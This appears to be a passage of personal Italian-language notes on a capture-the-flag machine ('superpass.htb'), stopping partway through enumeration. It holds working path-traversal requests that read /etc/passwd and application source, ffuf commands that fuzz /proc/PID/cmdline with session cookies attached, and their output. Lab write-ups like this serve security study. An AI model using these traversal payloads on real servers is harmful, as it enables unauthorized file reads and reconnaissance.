@@ -1,0 +1,334 @@
+10.10.11.203
+
+superpass.htb
+
+aggiungo al file host
+
+
+...
+SuperPassword
+
+A Super Password Manager
+
+
+
+provo a registrarmi:
+
+
+OperationalError
+
+sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2013, 'Lost connection to MySQL server during query')
+[SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password 
+FROM users 
+WHERE users.username = %(username_1)s 
+ LIMIT %(param_1)s]
+[parameters: {'username_1': '123', 'param_1': 1}]
+(Background on this error at: https://sqlalche.me/e/14/e3q8)
+
+
+
+
+Brought to you by DON'T PANIC, your friendly Werkzeug powered traceback interpreter. 
+
+
+
+
+nella homepage:
+
+
+
+Agile Developement
+
+We test and redeploy our website constantly.
+
+
+
+potrebbe essere interessante 
+
+
+l'errore sulla registrazione non mi ersce, piu sono riuscito a registrare un utente senza problemi 
+
+
+ho registrato utente admin:password
+
+
+
+
+
+
+
+c'è funzionalita di export:
+
+
+
+GET /download?fn=admin_export_0da9bc0cdd.csv HTTP/1.1
+Host: superpass.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=.eJydjsFqwzAQRH9F7NkUWSvvav0VvZcQ1tIqNrhNsJxTyL9X0D_oaRjeDDMvuNZd22oN5q8XuLMLfFtrejMY4HM3beb2-81tP-68O825Q3euW3OPnvmAy3v4Z-8y9PHD2grzeTytu63ADIxoiF7Zslgh0xgiovhRKiNFrrGGgKMUFem0cqI0Bg5ZA-mixZgyqyiKSmHPJLFQTZV8kOxjTMHGxMtUJEXCpBNh5XHygcoiWajfvz6bHX9vBN6_05hXoA.ZJB58Q.tjLw41nVaja7SUVXlTIvui3r0Ds; remember_token=9|1eaf68cd397933029f8527fea7b700541ae0f4e1a1ced6696e6f03cadcdb6697a422f4964b10e2e331a1f974d069d2d7e2d08cfea49c3f8582cfae9e0704c117
+Upgrade-Insecure-Requests: 1
+
+
+
+
+
+
+
+
+FileNotFoundError: [Errno 2] No such file or directory: '/tmp/admin_export_0da9bc0cdd.csv'
+ // Werkzeug Debugger
+
+
+ LFI:
+
+
+ GET /download?fn=../../../etc/passwd HTTP/1.1
+Host: superpass.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=.eJydjsFqwzAQRH9F7NkUWSvvav0VvZcQ1tIqNrhNsJxTyL9X0D_oaRjeDDMvuNZd22oN5q8XuLMLfFtrejMY4HM3beb2-81tP-68O825Q3euW3OPnvmAy3v4Z-8y9PHD2grzeTytu63ADIxoiF7Zslgh0xgiovhRKiNFrrGGgKMUFem0cqI0Bg5ZA-mixZgyqyiKSmHPJLFQTZV8kOxjTMHGxMtUJEXCpBNh5XHygcoiWajfvz6bHX9vBN6_05hXoA.ZJB58Q.tjLw41nVaja7SUVXlTIvui3r0Ds; remember_token=9|1eaf68cd397933029f8527fea7b700541ae0f4e1a1ced6696e6f03cadcdb6697a422f4964b10e2e331a1f974d069d2d7e2d08cfea49c3f8582cfae9e0704c117
+Upgrade-Insecure-Requests: 1
+
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+corum:x:1000:1000:corum:/home/corum:/bin/bash
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+_laurel:x:999:999::/var/log/laurel:/bin/false
+
+
+
+interessanti:
+
+
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+
+
+
+dagli errori che ottengo cercando di accedere a file che non esistono o non ho permessi ottengo anche il path dell'applicativo:
+
+
+    File "/app/app/superpass/views/vault_views.py", line 102, in download
+
+    with open(f'/tmp/{fn}', 'rb') as f:
+
+    PermissionError: [Errno 13] Permission denied: '/tmp/../../../etc/shadow'
+
+
+
+quindi posso provare a leggere il codice 
+
+
+
+
+
+import flask
+import subprocess
+from flask_login import login_required, current_user
+from superpass.infrastructure.view_modifiers import response
+import superpass.services.password_service as password_service
+from superpass.services.utility_service import get_random
+from superpass.data.password import Password
+
+
+blueprint = flask.Blueprint('vault', __name__, template_folder='templates')
+
+
+@blueprint.route('/vault')
+@response(template_file='vault/vault.html')
+@login_required
+def vault():
+    passwords = password_service.get_passwords_for_user(current_user.id)
+    print(f'{passwords=}')
+    return {'passwords': passwords}
+
+
+            .............................
+
+
+
+dagli import capisco anche quali sono altri file dell'app
+
+provo a leggere:
+
+
+services.password_service    ---->  /app/app/superpass/services/password_service.py
+
+
+
+import csv
+import datetime
+import sqlalchemy as sa
+import superpass.data.db_session as db_session
+from superpass.data.password import Password
+from superpass.data.user import User
+from superpass.services.utility_service import get_random
+from typing import Optional
+
+
+
+
+superpass.data.db_session   ------> /app/app/superpass/data/db_session.py
+
+
+superpass.data.password ----->  /app/app/superpass/data/password.py
+
+from superpass.data.modelbase import SqlAlchemyBase  ---> /app/app/superpass/data/modelbase.py
+
+superpass.data.db_session   ----->      /app/app/superpass/data/db_session.py
+
+
+/app/app/superpass/views/login_views.py
+
+
+posso provare a enumerare i processi running per vedere qual è la classe main e analizzare meglio il resto
+
+https://tun0.blog/posts/pidlfi/
+
+
+for i in $(seq 1 5000); do echo $i >> pid.txt; done && \
+
+
+
+ffuf -c -w pid.txt:FUZZ -u http://superpass.htb/download?fn=../../../../proc/FUZZ/cmdline -b "session=.eJydjsFqwzAQRH9F7NkUWSvvav0VvZcQ1tIqNrhNsJxTyL9X0D_oaRjeDDMvuNZd22oN5q8XuLMLfFtrejMY4HM3beb2-81tP-68O825Q3euW3OPnvmAy3v4Z-8y9PHD2grzeTytu63ADIxoiF7Zslgh0xgiovhRKiNFrrGGgKMUFem0cqI0Bg5ZA-mixZgyqyiKSmHPJLFQTZV8kOxjTMHGxMtUJEXCpBNh5XHygcoiWajfvz6bHX9vBN6_05hXoA.ZJB58Q.tjLw41nVaja7SUVXlTIvui3r0Ds; remember_token=9|1eaf68cd397933029f8527fea7b700541ae0f4e1a1ced6696e6f03cadcdb6697a422f4964b10e2e331a1f974d069d2d7e2d08cfea49c3f8582cfae9e0704c117"  -fc 500
+
+
+
+provo a filtrare per python cosi ho meno pid da analyzare 
+
+
+
+ffuf -c -w pid.txt:FUZZ -u http://superpass.htb/download?fn=../../../../proc/FUZZ/cmdline -b "session=.eJydjsFqwzAQRH9F7NkUWSvvav0VvZcQ1tIqNrhNsJxTyL9X0D_oaRjeDDMvuNZd22oN5q8XuLMLfFtrejMY4HM3beb2-81tP-68O825Q3euW3OPnvmAy3v4Z-8y9PHD2grzeTytu63ADIxoiF7Zslgh0xgiovhRKiNFrrGGgKMUFem0cqI0Bg5ZA-mixZgyqyiKSmHPJLFQTZV8kOxjTMHGxMtUJEXCpBNh5XHygcoiWajfvz6bHX9vBN6_05hXoA.ZJB58Q.tjLw41nVaja7SUVXlTIvui3r0Ds; remember_token=9|1eaf68cd397933029f8527fea7b700541ae0f4e1a1ced6696e6f03cadcdb6697a422f4964b10e2e331a1f974d069d2d7e2d08cfea49c3f8582cfae9e0704c117"  -fc 500 -mr "python"
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://superpass.htb/download?fn=../../../../proc/FUZZ/cmdline
+ :: Wordlist         : FUZZ: /home/kali/Desktop/repo/ctfs-writeups/htb/done/agile/pid.txt
+ :: Header           : Cookie: session=.eJydjsFqwzAQRH9F7NkUWSvvav0VvZcQ1tIqNrhNsJxTyL9X0D_oaRjeDDMvuNZd22oN5q8XuLMLfFtrejMY4HM3beb2-81tP-68O825Q3euW3OPnvmAy3v4Z-8y9PHD2grzeTytu63ADIxoiF7Zslgh0xgiovhRKiNFrrGGgKMUFem0cqI0Bg5ZA-mixZgyqyiKSmHPJLFQTZV8kOxjTMHGxMtUJEXCpBNh5XHygcoiWajfvz6bHX9vBN6_05hXoA.ZJB58Q.tjLw41nVaja7SUVXlTIvui3r0Ds; remember_token=9|1eaf68cd397933029f8527fea7b700541ae0f4e1a1ced6696e6f03cadcdb6697a422f4964b10e2e331a1f974d069d2d7e2d08cfea49c3f8582cfae9e0704c117
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Regexp: python
+ :: Filter           : Response status: 500
+________________________________________________
+
+[Status: 200, Size: 69, Words: 1, Lines: 1, Duration: 298ms]
+    * FUZZ: 838
+
+[Status: 200, Size: 103, Words: 1, Lines: 1, Duration: 206ms]
+    * FUZZ: 1094
+
+[Status: 200, Size: 103, Words: 1, Lines: 1, Duration: 193ms]
+    * FUZZ: 1096
+
+[Status: 200, Size: 80, Words: 1, Lines: 1, Duration: 226ms]
+    * FUZZ: 1093
+
+[Status: 200, Size: 80, Words: 1, Lines: 1, Duration: 214ms]
+    * FUZZ: 1097
+
+[Status: 200, Size: 103, Words: 1, Lines: 1, Duration: 377ms]
+    * FUZZ: 1871
+
+[Status: 200, Size: 103, Words: 1, Lines: 1, Duration: 420ms]
+    * FUZZ: 1874
+
+
+
+
+
+
+1094: non è l'app che cerco ma puo essere utile dopo: porta 5000 esposta solo internamente:
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 19 Jun 2023 20:44:40 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 103
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+/app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app 
+
+
+(sta anche su altre porte, dopo controllare)
+
+
+
+
+
+
+
+guess: (dal nome della view del vault)
+/app/app/superpass/views/account_views.py
+
+
+import flask
+import string
+from flask_login import login_user, logout_user
+from superpass.infrastructure.view_modifiers import response
+from superpass.services import user_service
+
+
+
+provo a vedere user_service, sembra essere la parte che crea/gestisce gli utenti
+
+/app/app/superpass/services/user_service.py
+
+altro da vedere:
+
+import superpass.services.password_service as password_service (dovrebbe essere quello che salva le pwd per gli utenti)
+
+/app/app/superpass/services/password_service.py
+
+
+
+
